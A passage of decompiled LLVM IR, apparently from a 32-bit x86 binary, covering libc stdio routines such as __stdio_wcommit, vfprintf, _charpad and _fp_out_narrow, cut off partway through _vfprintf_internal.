  %v2_8050b55 = add i32 %v1_8050b55, 20
  %v3_8050b55 = inttoptr i32 %v2_8050b55 to i32*
  store i32 %v0_8050b55, i32* %v3_8050b55, align 4
  br label %dec_label_pc_8050b58

dec_label_pc_8050b58:                             ; preds = %dec_label_pc_8050b31, %dec_label_pc_8050b44
  %v0_8050b5b = load i32, i32* %ebx.global-to-local, align 4
  %v1_8050b5b = add i32 %v0_8050b5b, 52
  %v2_8050b5b = inttoptr i32 %v1_8050b5b to i32*
  store i32 1, i32* %v2_8050b5b, align 4
  %v0_8050b62 = load i32, i32* @esi, align 4
  %v1_8050b63 = call i32 @__stdio_init_mutex(i32 %v0_8050b62)
  store i32 %v1_8050b63, i32* %eax.global-to-local, align 4
  %v0_8050b68 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8050b68 = add i32 %v0_8050b68, 32
  %v2_8050b68 = inttoptr i32 %v1_8050b68 to i32*
  %storemerge = load i32, i32* %v2_8050b68, align 4
  store i32 %storemerge, i32* %ebx.global-to-local, align 4
  %v1_8050b6e = icmp eq i32 %storemerge, 0
  %v1_8050b70 = icmp eq i1 %v1_8050b6e, false
  br i1 %v1_8050b70, label %dec_label_pc_8050b31, label %dec_label_pc_8050b6b.dec_label_pc_8050b8e.preheader_crit_edge

dec_label_pc_8050b6b.dec_label_pc_8050b8e.preheader_crit_edge: ; preds = %dec_label_pc_8050b58
  %storemerge12.pre = load i32, i32* bitcast (i32** @global_var_80622ec.706 to i32*), align 4
  br label %dec_label_pc_8050b8e.preheader

dec_label_pc_8050b8e.preheader:                   ; preds = %dec_label_pc_8050b6b.dec_label_pc_8050b8e.preheader_crit_edge, %entry
  %storemerge12 = phi i32 [ %storemerge12.pre, %dec_label_pc_8050b6b.dec_label_pc_8050b8e.preheader_crit_edge ], [ %storemerge21, %entry ]
  store i32 %storemerge12, i32* @ebx, align 4
  %v1_8050b8e3 = icmp eq i32 %storemerge12, 0
  %v1_8050b9010 = icmp eq i1 %v1_8050b8e3, false
  br i1 %v1_8050b9010, label %dec_label_pc_8050b7a.preheader, label %dec_label_pc_8050b92

dec_label_pc_8050b7a.preheader:                   ; preds = %dec_label_pc_8050b8e.preheader
  br label %dec_label_pc_8050b7a

dec_label_pc_8050b7a:                             ; preds = %dec_label_pc_8050b7a.preheader, %dec_label_pc_8050b8b
  %v0_8050b82 = phi i32 [ %storemerge1, %dec_label_pc_8050b8b ], [ %storemerge12, %dec_label_pc_8050b7a.preheader ]
  %v1_8050b7a = inttoptr i32 %v0_8050b82 to i8*
  %v2_8050b7a = load i8, i8* %v1_8050b7a, align 1
  %v3_8050b7a = and i8 %v2_8050b7a, 64
  %v4_8050b7a = icmp eq i8 %v3_8050b7a, 0
  br i1 %v4_8050b7a, label %dec_label_pc_8050b8b, label %dec_label_pc_8050b7f

dec_label_pc_8050b7f:                             ; preds = %dec_label_pc_8050b7a
  %v1_8050b83 = call i32 @__stdio_wcommit(i32 %v0_8050b82)
  store i32 %v1_8050b83, i32* %eax.global-to-local, align 4
  %v0_8050b8b.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8050b8b

dec_label_pc_8050b8b:                             ; preds = %dec_label_pc_8050b7a, %dec_label_pc_8050b7f
  %v0_8050b8b = phi i32 [ %v0_8050b82, %dec_label_pc_8050b7a ], [ %v0_8050b8b.pre, %dec_label_pc_8050b7f ]
  %v1_8050b8b = add i32 %v0_8050b8b, 32
  %v2_8050b8b = inttoptr i32 %v1_8050b8b to i32*
  %storemerge1 = load i32, i32* %v2_8050b8b, align 4
  store i32 %storemerge1, i32* @ebx, align 4
  %v1_8050b8e = icmp eq i32 %storemerge1, 0
  %v1_8050b90 = icmp eq i1 %v1_8050b8e, false
  br i1 %v1_8050b90, label %dec_label_pc_8050b7a, label %dec_label_pc_8050b92

dec_label_pc_8050b92:                             ; preds = %dec_label_pc_8050b8b, %dec_label_pc_8050b8e.preheader
  %v2_8050b92 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8050b92, i32* %eax.global-to-local, align 4
  %v2_8050b93 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8050b93, i32* @ebx, align 4
  store i32 %v0_8050b0e, i32* @esi, align 4
  ret i32 %v2_8050b92

; uselistorder directives
  uselistorder i32 %storemerge1, { 1, 2, 0 }
  uselistorder i32 %storemerge12, { 2, 1, 0 }
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32* %ebx.global-to-local, { 8, 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32 (i32)* @__stdio_init_mutex, { 2, 1, 0, 3, 4 }
  uselistorder label %dec_label_pc_8050b8b, { 1, 0 }
  uselistorder label %dec_label_pc_8050b7a, { 1, 0 }
  uselistorder label %dec_label_pc_8050b58, { 1, 0 }
  uselistorder label %dec_label_pc_8050b31, { 1, 0 }
}

define i32 @__stdio_wcommit(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %tmp11 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp11, i32* %stack_var_-12, align 4
  %v0_8050b98 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_8050ba0 = add i32 %arg1, 8
  %v2_8050ba0 = inttoptr i32 %v1_8050ba0 to i32*
  %v3_8050ba0 = load i32, i32* %v2_8050ba0, align 4
  store i32 %v3_8050ba0, i32* %edx.global-to-local, align 4
  %v1_8050ba3 = add i32 %arg1, 16
  %v2_8050ba3 = inttoptr i32 %v1_8050ba3 to i32*
  %v3_8050ba3 = load i32, i32* %v2_8050ba3, align 4
  %v2_8050ba6 = sub i32 %v3_8050ba3, %v3_8050ba0
  %v12_8050ba6 = icmp eq i32 %v2_8050ba6, 0
  store i32 %v2_8050ba6, i32* %eax.global-to-local, align 4
  br i1 %v12_8050ba6, label %dec_label_pc_8050bb9, label %dec_label_pc_8050baa

dec_label_pc_8050baa:                             ; preds = %entry
  store i32 %v3_8050ba0, i32* %v2_8050ba3, align 4
  %v0_8050bad = load i32, i32* @ecx, align 4
  %v0_8050bae = load i32, i32* %eax.global-to-local, align 4
  %v0_8050baf = load i32, i32* %edx.global-to-local, align 4
  %v0_8050bb0 = load i32, i32* @ebx, align 4
  %v4_8050bb1 = inttoptr i32 %v0_8050bb0 to i16*
  %v5_8050bb1 = call i32 @__stdio_WRITE(i16* %v4_8050bb1, i32 %v0_8050baf, i32 %v0_8050bae, i32 %v0_8050bad)
  store i32 %v5_8050bb1, i32* %eax.global-to-local, align 4
  %v0_8050bb9.pre = load i32, i32* @ebx, align 4
  %v2_8050bbf.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_8050bb9

dec_label_pc_8050bb9:                             ; preds = %entry, %dec_label_pc_8050baa
  %v2_8050bbf = phi i32 [ %tmp11, %entry ], [ %v2_8050bbf.pre, %dec_label_pc_8050baa ]
  %v0_8050bb9 = phi i32 [ %arg1, %entry ], [ %v0_8050bb9.pre, %dec_label_pc_8050baa ]
  %v1_8050bb9 = add i32 %v0_8050bb9, 16
  %v2_8050bb9 = inttoptr i32 %v1_8050bb9 to i32*
  %v3_8050bb9 = load i32, i32* %v2_8050bb9, align 4
  store i32 %v3_8050bb9, i32* %eax.global-to-local, align 4
  %v2_8050bbc = add i32 %v0_8050bb9, 8
  %v3_8050bbc = inttoptr i32 %v2_8050bbc to i32*
  %v4_8050bbc = load i32, i32* %v3_8050bbc, align 4
  %v5_8050bbc = sub i32 %v3_8050bb9, %v4_8050bbc
  store i32 %v5_8050bbc, i32* %eax.global-to-local, align 4
  store i32 %v2_8050bbf, i32* @edx, align 4
  store i32 %v0_8050b98, i32* @ebx, align 4
  ret i32 %v5_8050bbc

; uselistorder directives
  uselistorder i32 %v0_8050bb9, { 1, 0 }
  uselistorder i32 %arg1, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_8050bb9, { 1, 0 }
}

define i32 @__GI_vfprintf(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %v12_8050bc7 = ptrtoint i32* %stack_var_-28 to i32
  %v4_8050bca = ptrtoint i16* %arg1 to i32
  store i32 %v4_8050bca, i32* @esi, align 4
  %v1_8050bce = add i32 %v4_8050bca, 52
  %v2_8050bce = inttoptr i32 %v1_8050bce to i32*
  %v3_8050bce = load i32, i32* %v2_8050bce, align 4
  store i32 %v3_8050bce, i32* @edi, align 4
  %v1_8050bd1 = icmp eq i32 %v3_8050bce, 0
  %v1_8050bd3 = icmp eq i1 %v1_8050bd1, false
  br i1 %v1_8050bd3, label %dec_label_pc_8050bf4, label %dec_label_pc_8050bd5

dec_label_pc_8050bd5:                             ; preds = %entry
  %v1_8050bd5 = add i32 %v4_8050bca, 56
  store i32 %v1_8050bd5, i32* @ebx, align 4
  store i32 %v12_8050bc7, i32* @eax, align 4
  %v3_8050be4 = call i32 @__pthread_return_void(i32 %v12_8050bc7, i32 134562299)
  %v0_8050be9 = load i32, i32* @ebx, align 4
  %v2_8050bec = call i32 @__pthread_return_0(i32 %v0_8050be9)
  %v0_8050bf4.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8050bf4

dec_label_pc_8050bf4:                             ; preds = %entry, %dec_label_pc_8050bd5
  %v0_8050c0d = phi i32 [ %v4_8050bca, %entry ], [ %v0_8050bf4.pre, %dec_label_pc_8050bd5 ]
  %v1_8050bf4 = inttoptr i32 %v0_8050c0d to i16*
  %v2_8050bf4 = load i16, i16* %v1_8050bf4, align 2
  %v1_8050bf7 = and i16 %v2_8050bf4, 192
  %v6_8050bfc = icmp eq i16 %v1_8050bf7, 192
  br i1 %v6_8050bfc, label %dec_label_pc_8050bf4.dec_label_pc_8050c1a_crit_edge, label %dec_label_pc_8050c03

dec_label_pc_8050bf4.dec_label_pc_8050c1a_crit_edge: ; preds = %dec_label_pc_8050bf4
  br label %dec_label_pc_8050c1a

dec_label_pc_8050c03:                             ; preds = %dec_label_pc_8050bf4
  %v0_8050c03 = load i32, i32* @ecx, align 4
  store i32 -1, i32* @ebx, align 4
  %v6_8050c0e = call i32 @__stdio_trans2w_o(i16* %v1_8050bf4, i32 128, i32 %v0_8050c03, i32 %v0_8050c03)
  %v1_8050c16 = icmp eq i32 %v6_8050c0e, 0
  %v1_8050c18 = icmp eq i1 %v1_8050c16, false
  br i1 %v1_8050c18, label %dec_label_pc_8050c2e, label %dec_label_pc_8050c03.dec_label_pc_8050c1a_crit_edge

dec_label_pc_8050c03.dec_label_pc_8050c1a_crit_edge: ; preds = %dec_label_pc_8050c03
  %v0_8050c23.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8050c1a

dec_label_pc_8050c1a:                             ; preds = %dec_label_pc_8050bf4.dec_label_pc_8050c1a_crit_edge, %dec_label_pc_8050c03.dec_label_pc_8050c1a_crit_edge
  %v0_8050c23 = phi i32 [ %v0_8050c0d, %dec_label_pc_8050bf4.dec_label_pc_8050c1a_crit_edge ], [ %v0_8050c23.pre, %dec_label_pc_8050c03.dec_label_pc_8050c1a_crit_edge ]
  %v4_8050c24 = inttoptr i32 %arg2 to i8*
  %v5_8050c24 = call i32 @_vfprintf_internal(i32 %v0_8050c23, i8* %v4_8050c24, i32 %arg3)
  store i32 %v5_8050c24, i32* @ebx, align 4
  br label %dec_label_pc_8050c2e

dec_label_pc_8050c2e:                             ; preds = %dec_label_pc_8050c03, %dec_label_pc_8050c1a
  br i1 %v1_8050bd3, label %dec_label_pc_8050c43, label %dec_label_pc_8050c32

dec_label_pc_8050c32:                             ; preds = %dec_label_pc_8050c2e
  store i32 %v12_8050bc7, i32* @eax, align 4
  %v3_8050c3b = call i32 @__pthread_return_void(i32 %v12_8050bc7, i32 1)
  br label %dec_label_pc_8050c43

dec_label_pc_8050c43:                             ; preds = %dec_label_pc_8050c2e, %dec_label_pc_8050c32
  %v0_8050c46 = load i32, i32* @ebx, align 4
  ret i32 %v0_8050c46

; uselistorder directives
  uselistorder i32 %v12_8050bc7, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_8050c43, { 1, 0 }
  uselistorder label %dec_label_pc_8050c2e, { 1, 0 }
  uselistorder label %dec_label_pc_8050c1a, { 1, 0 }
  uselistorder label %dec_label_pc_8050bf4, { 1, 0 }
}

define i32 @_charpad() local_unnamed_addr {
entry:
  %stack_var_-13 = alloca i32, align 4
  %v0_8050c4c = load i32, i32* @edi, align 4
  %v0_8050c4d = load i32, i32* @eax, align 4
  store i32 %v0_8050c4d, i32* @edi, align 4
  %v0_8050c4f = load i32, i32* @esi, align 4
  %v0_8050c50 = load i32, i32* @ecx, align 4
  store i32 %v0_8050c50, i32* @esi, align 4
  %v0_8050c52 = load i32, i32* @ebx, align 4
  store i32 %v0_8050c50, i32* @ebx, align 4
  %v0_8050c58 = load i32, i32* @edx, align 4
  store i32 %v0_8050c58, i32* %stack_var_-13, align 4
  %v1_8050c5f2 = icmp eq i32 %v0_8050c50, 0
  br i1 %v1_8050c5f2, label %dec_label_pc_8050c77, label %dec_label_pc_8050c63.lr.ph

dec_label_pc_8050c63.lr.ph:                       ; preds = %entry
  %v2_8050c63 = ptrtoint i32* %stack_var_-13 to i32
  br label %dec_label_pc_8050c63

dec_label_pc_8050c5e:                             ; preds = %dec_label_pc_8050c63
  %v1_8050c5e = add i32 %v0_8050c5e, -1
  %v8_8050c5e = icmp eq i32 %v1_8050c5e, 0
  store i32 %v1_8050c5e, i32* @ebx, align 4
  br i1 %v8_8050c5e, label %dec_label_pc_8050c77.loopexit, label %dec_label_pc_8050c5e.dec_label_pc_8050c63_crit_edge

dec_label_pc_8050c5e.dec_label_pc_8050c63_crit_edge: ; preds = %dec_label_pc_8050c5e
  %v0_8050c67.pre = load i32, i32* @edx, align 4
  %v0_8050c68.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8050c63

dec_label_pc_8050c63:                             ; preds = %dec_label_pc_8050c5e.dec_label_pc_8050c63_crit_edge, %dec_label_pc_8050c63.lr.ph
  %v0_8050c68 = phi i32 [ %v0_8050c68.pre, %dec_label_pc_8050c5e.dec_label_pc_8050c63_crit_edge ], [ %v0_8050c4d, %dec_label_pc_8050c63.lr.ph ]
  %v0_8050c67 = phi i32 [ %v0_8050c67.pre, %dec_label_pc_8050c5e.dec_label_pc_8050c63_crit_edge ], [ %v0_8050c58, %dec_label_pc_8050c63.lr.ph ]
  %v4_8050c6c = call i32 @__stdio_fwrite(i32 %v2_8050c63, i32 1, i32 %v0_8050c68, i32 %v0_8050c67)
  %v8_8050c74 = icmp eq i32 %v4_8050c6c, 1
  %v0_8050c5e = load i32, i32* @ebx, align 4
  br i1 %v8_8050c74, label %dec_label_pc_8050c5e, label %dec_label_pc_8050c77.loopexit

dec_label_pc_8050c77.loopexit:                    ; preds = %dec_label_pc_8050c5e, %dec_label_pc_8050c63
  %v1_8050c7a.ph = phi i32 [ %v0_8050c5e, %dec_label_pc_8050c63 ], [ 0, %dec_label_pc_8050c5e ]
  %v0_8050c7a.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8050c77

dec_label_pc_8050c77:                             ; preds = %dec_label_pc_8050c77.loopexit, %entry
  %v0_8050c7a = phi i32 [ 0, %entry ], [ %v0_8050c7a.pre, %dec_label_pc_8050c77.loopexit ]
  %v1_8050c7a = phi i32 [ 0, %entry ], [ %v1_8050c7a.ph, %dec_label_pc_8050c77.loopexit ]
  %v2_8050c7a = sub i32 %v0_8050c7a, %v1_8050c7a
  store i32 %v0_8050c52, i32* @ebx, align 4
  store i32 %v0_8050c4f, i32* @esi, align 4
  store i32 %v0_8050c4c, i32* @edi, align 4
  ret i32 %v2_8050c7a

; uselistorder directives
  uselistorder i32 %v1_8050c5e, { 1, 0 }
  uselistorder i32* %stack_var_-13, { 1, 0 }
  uselistorder label %dec_label_pc_8050c77.loopexit, { 1, 0 }
}

define i32 @_fp_out_narrow(i32 %arg1, i32 %arg2, i32 %arg3, i8* %arg4) local_unnamed_addr {
entry:
  store i32 0, i32* @ebp, align 4
  store i32 %arg2, i32* @edi, align 4
  store i32 %arg3, i32* @ebx, align 4
  %v3_8050c95 = trunc i32 %arg2 to i8
  %v5_8050c95 = icmp slt i8 %v3_8050c95, 0
  %v1_8050c97 = icmp eq i1 %v5_8050c95, false
  %tmp21 = ptrtoint i8* %arg4 to i32
  br i1 %v1_8050c97, label %dec_label_pc_8050cc8, label %dec_label_pc_8050c99

dec_label_pc_8050c99:                             ; preds = %entry
  %v3_8050ca0 = call i32 @strlen(i8* %arg4)
  %v0_8050ca8 = load i32, i32* @ebx, align 4
  %v2_8050ca8 = sub i32 %v0_8050ca8, %v3_8050ca0
  store i32 %v2_8050ca8, i32* @ebx, align 4
  store i32 %v3_8050ca0, i32* @esi, align 4
  %tmp23 = icmp slt i32 %v2_8050ca8, 1
  br i1 %tmp23, label %dec_label_pc_8050cc6, label %dec_label_pc_8050cb0

dec_label_pc_8050cb0:                             ; preds = %dec_label_pc_8050c99
  store i32 %arg1, i32* @eax, align 4
  %v0_8050cb4 = load i32, i32* @edi, align 4
  %v1_8050cb4 = urem i32 %v0_8050cb4, 128
  store i32 %v1_8050cb4, i32* @edi, align 4
  store i32 %v2_8050ca8, i32* @ecx, align 4
  store i32 %v1_8050cb4, i32* @edx, align 4
  %v0_8050cbb = call i32 @_charpad()
  %v12_8050cc0 = icmp eq i32 %v0_8050cbb, %v2_8050ca8
  store i32 %v0_8050cbb, i32* @ebp, align 4
  %v1_8050cc4 = icmp eq i1 %v12_8050cc0, false
  br i1 %v1_8050cc4, label %dec_label_pc_8050ce2, label %dec_label_pc_8050cb0.dec_label_pc_8050cc6_crit_edge

dec_label_pc_8050cb0.dec_label_pc_8050cc6_crit_edge: ; preds = %dec_label_pc_8050cb0
  %v0_8050cc6.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8050cc6

dec_label_pc_8050cc6:                             ; preds = %dec_label_pc_8050cb0.dec_label_pc_8050cc6_crit_edge, %dec_label_pc_8050c99
  %v0_8050cc6 = phi i32 [ %v0_8050cc6.pre, %dec_label_pc_8050cb0.dec_label_pc_8050cc6_crit_edge ], [ %v3_8050ca0, %dec_label_pc_8050c99 ]
  store i32 %v0_8050cc6, i32* @ebx, align 4
  br label %dec_label_pc_8050cc8

dec_label_pc_8050cc8:                             ; preds = %entry, %dec_label_pc_8050cc6
  %v0_8050cd3 = phi i32 [ %arg3, %entry ], [ %v0_8050cc6, %dec_label_pc_8050cc6 ]
  %tmp24 = icmp slt i32 %v0_8050cd3, 1
  br i1 %tmp24, label %dec_label_pc_8050ce0, label %dec_label_pc_8050cce

dec_label_pc_8050cce:                             ; preds = %dec_label_pc_8050cc8
  %v0_8050cce = load i32, i32* @ecx, align 4
  %v5_8050cd8 = call i32 @__stdio_fwrite(i32 %tmp21, i32 %v0_8050cd3, i32 %arg1, i32 %v0_8050cce)
  br label %dec_label_pc_8050ce0

dec_label_pc_8050ce0:                             ; preds = %dec_label_pc_8050cc8, %dec_label_pc_8050cce
  %v1_8050ce0 = phi i32 [ 0, %dec_label_pc_8050cc8 ], [ %v5_8050cd8, %dec_label_pc_8050cce ]
  %v0_8050ce0 = load i32, i32* @ebp, align 4
  %v2_8050ce0 = add i32 %v0_8050ce0, %v1_8050ce0
  br label %dec_label_pc_8050ce2

dec_label_pc_8050ce2:                             ; preds = %dec_label_pc_8050cb0, %dec_label_pc_8050ce0
  %v0_8050ce5 = phi i32 [ %v0_8050cbb, %dec_label_pc_8050cb0 ], [ %v2_8050ce0, %dec_label_pc_8050ce0 ]
  ret i32 %v0_8050ce5

; uselistorder directives
  uselistorder i32 %v0_8050cd3, { 1, 0 }
  uselistorder i32 %v0_8050cbb, { 1, 2, 0 }
  uselistorder i32 %v1_8050cb4, { 1, 0 }
  uselistorder i32 %v2_8050ca8, { 0, 2, 1, 3 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_8050ce2, { 1, 0 }
  uselistorder label %dec_label_pc_8050ce0, { 1, 0 }
  uselistorder label %dec_label_pc_8050cc8, { 1, 0 }
}

define i32 @_vfprintf_internal(i32 %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %sf.global-to-local = alloca i1, align 1
  %st0.global-to-local = alloca x86_fp80, align 4
  %stack_var_-364 = alloca i32, align 4
  %stack_var_-348 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8050cef = load i32, i32* @ebx, align 4
  store i32 %v0_8050cef, i32* %stack_var_-16, align 4
  %v4_8050cef = ptrtoint i32* %stack_var_-16 to i32
  %v1_8050cf0 = add i32 %v4_8050cef, -356
  %v10_8050cf0 = icmp slt i32 %v1_8050cf0, 0
  store i1 %v10_8050cf0, i1* %sf.global-to-local, align 1
  %v4_8050cf6 = ptrtoint i8* %arg2 to i32
  store i32 %v4_8050cf6, i32* @ebx, align 4
  %v2_8050cfe = ptrtoint i32* %stack_var_-348 to i32
  store i32 %v2_8050cfe, i32* @esi, align 4
  %v5_8050d03 = call i32 @_ppfs_init(i32* nonnull %stack_var_-348, i32 %v4_8050cf6)
  store i32 %v5_8050d03, i32* %eax.global-to-local, align 4
  %v2_8050d0b = icmp slt i32 %v5_8050d03, 0
  store i1 %v2_8050d0b, i1* %sf.global-to-local, align 1
  %v1_8050d0d = icmp eq i1 %v2_8050d0b, false
  br i1 %v1_8050d0d, label %dec_label_pc_8050d4d, label %dec_label_pc_8050d0f

dec_label_pc_8050d0f:                             ; preds = %entry
  %v12_8050d08 = ptrtoint i32* %stack_var_-364 to i32
  %v3_8050d0f = load i32, i32* %stack_var_-348, align 4
  store i32 %v3_8050d0f, i32* @ebx, align 4
  %v1_8050d13 = add i32 %v12_8050d08, -12
  %v10_8050d13 = icmp slt i32 %v1_8050d13, 0
  store i1 %v10_8050d13, i1* %sf.global-to-local, align 1
  %v5_8050d16 = inttoptr i32 %v3_8050d0f to i8*
  %v3_8050d17 = call i32 @strlen(i8* %v5_8050d16)
  store i32 %v3_8050d17, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %stack_var_-364, align 4
  %v1_8050d26 = icmp eq i32 %v3_8050d17, 0
  %v2_8050d26 = icmp slt i32 %v3_8050d17, 0
  store i1 %v2_8050d26, i1* %sf.global-to-local, align 1
  br i1 %v1_8050d26, label %dec_label_pc_8051296, label %dec_label_pc_8050d2e

dec_label_pc_8050d2e:                             ; preds = %dec_label_pc_8050d0f
  %v0_8050d2e = load i32, i32* @edx, align 4
  %v0_8050d37 = load i32, i32* @ebx, align 4
  %v6_8050d38 = call i32 @__stdio_fwrite(i32 %v0_8050d37, i32 %v3_8050d17, i32 %arg1, i32 %v0_8050d2e)
  store i32 %v6_8050d38, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %stack_var_-364, align 4
  %v0_8050d45 = load i32, i32* @esp, align 4
  %v1_8050d45 = add i32 %v0_8050d45, 16
  %v7_8050d45 = icmp slt i32 %v1_8050d45, 0
  store i1 %v7_8050d45, i1* %sf.global-to-local, align 1
  br label %dec_label_pc_8051296

dec_label_pc_8050d4d:                             ; preds = %entry
  %v6_8050d57 = call i32 @_ppfs_prepargs(i32 %v2_8050cfe, i32 %arg3, i32 %v5_8050d03, i32 %v5_8050d03)
  store i32 %v6_8050d57, i32* %eax.global-to-local, align 4
  %v0_8050d5c = load i32, i32* @ebx, align 4
  store i32 %v0_8050d5c, i32* %edx.global-to-local, align 4
  store i32 0, i32* %stack_var_-364, align 4
  %v0_8050d66 = load i32, i32* @esp, align 4
  %v1_8050d66 = add i32 %v0_8050d66, 16
  %v7_8050d66 = icmp slt i32 %v1_8050d66, 0
  store i1 %v7_8050d66, i1* %sf.global-to-local, align 1
  br label %dec_label_pc_8050d6c

dec_label_pc_8050d6b:                             ; preds = %dec_label_pc_8050d72
  %v1_8050d6b = add i32 %v0_8050d7a, 1
  %v9_8050d6b = icmp slt i32 %v1_8050d6b, 0
  store i1 %v9_8050d6b, i1* %sf.global-to-local, align 1
  store i32 %v1_8050d6b, i32* @ebx, align 4
  br label %dec_label_pc_8050d6c.backedge

dec_label_pc_8050d6c.backedge:                    ; preds = %dec_label_pc_8050d6b, %dec_label_pc_805127c, %dec_label_pc_8051287
  %v1_8050d7621 = phi i32 [ %v1_8050d7e, %dec_label_pc_8050d6b ], [ %v3_805127c, %dec_label_pc_805127c ], [ %v1_8050daa, %dec_label_pc_8051287 ]
  %v0_8050d6c19 = phi i32 [ %v1_8050d6b, %dec_label_pc_8050d6b ], [ %v3_805127c, %dec_label_pc_805127c ], [ %v1_8051287, %dec_label_pc_8051287 ]
  %v4_8050d6c.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050d6c

dec_label_pc_8050d6c:                             ; preds = %dec_label_pc_8050d6c.backedge, %dec_label_pc_8050d4d
  %v1_8050d7e = phi i32 [ %v1_8050d7621, %dec_label_pc_8050d6c.backedge ], [ %v0_8050d5c, %dec_label_pc_8050d4d ]
  %v0_8050d7a = phi i32 [ %v0_8050d6c19, %dec_label_pc_8050d6c.backedge ], [ %v0_8050d5c, %dec_label_pc_8050d4d ]
  %v4_8050d6c = phi i32 [ %v4_8050d6c.pre, %dec_label_pc_8050d6c.backedge ], [ %v6_8050d57, %dec_label_pc_8050d4d ]
  %v1_8050d6c = inttoptr i32 %v0_8050d7a to i8*
  %v2_8050d6c = load i8, i8* %v1_8050d6c, align 1
  %v3_8050d6c = zext i8 %v2_8050d6c to i32
  %v5_8050d6c = and i32 %v4_8050d6c, -256
  %v6_8050d6c = or i32 %v3_8050d6c, %v5_8050d6c
  store i32 %v6_8050d6c, i32* %eax.global-to-local, align 4
  %v4_8050d6e = icmp eq i8 %v2_8050d6c, 0
  %v5_8050d6e = icmp slt i8 %v2_8050d6c, 0
  store i1 %v5_8050d6e, i1* %sf.global-to-local, align 1
  br i1 %v4_8050d6e, label %dec_label_pc_8050d76, label %dec_label_pc_8050d72

dec_label_pc_8050d72:                             ; preds = %dec_label_pc_8050d6c
  %v2_8050d72 = add i8 %v2_8050d6c, -37
  %v10_8050d72 = icmp eq i8 %v2_8050d72, 0
  %v11_8050d72 = icmp slt i8 %v2_8050d72, 0
  store i1 %v11_8050d72, i1* %sf.global-to-local, align 1
  %v1_8050d74 = icmp eq i1 %v10_8050d72, false
  br i1 %v1_8050d74, label %dec_label_pc_8050d6b, label %dec_label_pc_8050d76

dec_label_pc_8050d76:                             ; preds = %dec_label_pc_8050d72, %dec_label_pc_8050d6c
  %v2_8050d76 = sub i32 %v0_8050d7a, %v1_8050d7e
  %v12_8050d76 = icmp eq i32 %v2_8050d76, 0
  %v13_8050d76 = icmp slt i32 %v2_8050d76, 0
  store i1 %v13_8050d76, i1* %sf.global-to-local, align 1
  br i1 %v12_8050d76, label %dec_label_pc_8050da1, label %dec_label_pc_8050d7a

dec_label_pc_8050d7a:                             ; preds = %dec_label_pc_8050d76
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 %v2_8050d76, i32* @esi, align 4
  store i1 %v13_8050d76, i1* %sf.global-to-local, align 1
  %tmp66 = icmp slt i32 %v2_8050d76, 1
  br i1 %tmp66, label %dec_label_pc_8050d96, label %dec_label_pc_8050d84

dec_label_pc_8050d84:                             ; preds = %dec_label_pc_8050d7a
  %v0_8050d84 = load i32, i32* @ebp, align 4
  %v1_8050d84 = load i32, i32* @esp, align 4
  %v2_8050d84 = add i32 %v1_8050d84, -4
  %v3_8050d84 = inttoptr i32 %v2_8050d84 to i32*
  store i32 %v0_8050d84, i32* %v3_8050d84, align 4
  %v1_8050d85 = add i32 %v1_8050d84, 368
  %v2_8050d85 = inttoptr i32 %v1_8050d85 to i32*
  %v3_8050d85 = load i32, i32* %v2_8050d85, align 4
  %v5_8050d85 = add i32 %v1_8050d84, -8
  %v6_8050d85 = inttoptr i32 %v5_8050d85 to i32*
  store i32 %v3_8050d85, i32* %v6_8050d85, align 4
  %v0_8050d8c = load i32, i32* @esi, align 4
  %v2_8050d8c = add i32 %v1_8050d84, -12
  %v3_8050d8c = inttoptr i32 %v2_8050d8c to i32*
  store i32 %v0_8050d8c, i32* %v3_8050d8c, align 4
  %v0_8050d8d = load i32, i32* %edx.global-to-local, align 4
  %v2_8050d8d = add i32 %v1_8050d84, -16
  %v3_8050d8d = inttoptr i32 %v2_8050d8d to i32*
  store i32 %v0_8050d8d, i32* %v3_8050d8d, align 4
  %v0_8050d8e = load i32, i32* %stack_var_-364, align 4
  %v4_8050d8e = call i32 @__stdio_fwrite(i32 %v0_8050d8e, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8050d8e, i32* %eax.global-to-local, align 4
  %v0_8050d93 = load i32, i32* @esp, align 4
  %v1_8050d93 = add i32 %v0_8050d93, 16
  %v7_8050d93 = icmp slt i32 %v1_8050d93, 0
  store i1 %v7_8050d93, i1* %sf.global-to-local, align 1
  %v1_8050d96.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8050d96

dec_label_pc_8050d96:                             ; preds = %dec_label_pc_8050d7a, %dec_label_pc_8050d84
  %v3_8050d9e = phi i32 [ %v2_8050d76, %dec_label_pc_8050d7a ], [ %v1_8050d96.pre, %dec_label_pc_8050d84 ]
  %v0_8050d96 = phi i32 [ 0, %dec_label_pc_8050d7a ], [ %v4_8050d8e, %dec_label_pc_8050d84 ]
  %v2_8050d96 = sub i32 %v0_8050d96, %v3_8050d9e
  %v12_8050d96 = icmp eq i32 %v2_8050d96, 0
